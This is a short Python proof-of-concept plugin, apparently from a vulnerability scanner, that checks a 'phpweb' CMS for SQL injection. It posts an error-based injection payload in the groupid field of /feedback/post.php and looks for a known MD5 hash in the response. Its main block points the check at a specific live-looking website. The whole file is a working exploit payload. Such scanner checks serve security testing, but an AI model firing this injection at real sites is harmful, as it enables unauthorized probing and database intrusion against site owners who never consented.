#!/usr/bin/env python
# -*- coding: utf-8 -*-

def assign(service, arg):
    if service == "phpweb":
        return True, arg

def audit(arg):
    url = arg
    url = url + '/feedback/post.php'
    post_data = "act=formsend&company=e&content=&groupid=11' AND (SELECT 3264 FROM(SELECT COUNT(*),CONCAT(0x7164647a71,(MID((IFNULL(CAST(md5(3.14) AS CHAR),0x20)),1,50)),0x7177767771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND 'cmij'='cmij&ImgCode=e&name=e&qq=e&tel=e&title=e"
    code, head, body, _, _ = curl.curl('-d "%s" %s' % (post_data,url))
    if code == 200:
        if body and body.find('4beed3b9c4a886067de0e3a094246f78') != -1:
            security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('phpweb', 'http://www.qjyjjz.cn/')[1])
